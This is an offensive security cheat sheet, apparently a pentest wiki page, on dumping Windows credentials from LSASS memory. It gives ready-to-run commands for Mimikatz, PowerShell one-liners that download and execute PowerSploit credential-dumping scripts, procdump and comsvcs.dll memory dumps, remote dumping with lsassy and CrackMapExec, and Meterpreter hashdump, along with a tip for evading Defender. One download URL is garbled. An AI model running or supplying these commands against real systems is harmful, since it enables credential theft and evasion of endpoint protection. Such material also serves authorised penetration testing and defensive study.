---
description: Local Security Authority Subsystem Service
---

# LSASS

## Theory

LSASS process stores credentials in its memory. With admin rights these crendentials can be dumped.

## Method

### Bypass LSASS protection

#### PPLdump

[https://github.com/itm4n/PPLdump](https://github.com/itm4n/PPLdump)

### Locally

#### Mimikatz

* Set privilege debug

```
privilege::debug
```

* Enumerate all possible credentials

```
sekurlsa::logonPasswords full
```

#### Out-Minidump.ps1

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercon
estation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); Get-Process lsass | Out-Minidump
```

#### Invoke-Mimikatz.ps1

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds
```

#### Procdump

```bash
procdump.exe -accepteula -ma lsass.exe <file>
```

* The output  needs to be openend with `Mimikatz` from a Windows compatible (version and architecture) with the targeted workstation.
* Switch in the LSASS context of the dumped file

```
sekurlsa::minidump <ouput>
```

* Enumerate all possible credentials

```
sekurlsa::logonPasswords full
```

> _Rename **procdump.exe **to **dump64.exe** and place it in the "**C:\Program Files (x86)\Microsoft Visual Studio**\*" folder, you can bypass Defender and dump LSASS._

![From https://twitter.com/mrd0x/status/1460597833917251595](<../../../../.gitbook/assets/image (7).png>)

#### Comsvcs.dll

```bash
C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <pid> C:\Temp\out.dmp
```

#### Dumpert

[https://github.com/outflanknl/Dumpert](https://github.com/outflanknl/Dumpert)

```batch
.\od.exe
```

```powershell
rundll32.exe od.dll,Dump
```

#### HandleKatz

[https://github.com/codewhitesec/HandleKatz](https://github.com/codewhitesec/HandleKatz)

### Remotely

#### LSASSY

#### [https://github.com/Hackndo/lsassy](https://github.com/Hackndo/lsassy)

#### Dumpert

```bash
lsassy -d "<dom>" -u "<user>" -p "<pwd>" <ip> -m 5 --dumpert /home/user/Bureau/od.exe
```

#### CrackMapExec

#### Using Mimikatz

```bash
crackmapexec smb <ip> '<user>' -p '<pwd' -d <dom> --mimikatz-cmd "sekurlsa::logonPasswords full"
```

### Meterpreter

* Dump local SAM database

`hashdump`

* Use mimikatz

`load mimikatz`&#x20;

`mimikatz_command -f sekurlsa::logonPasswords full`
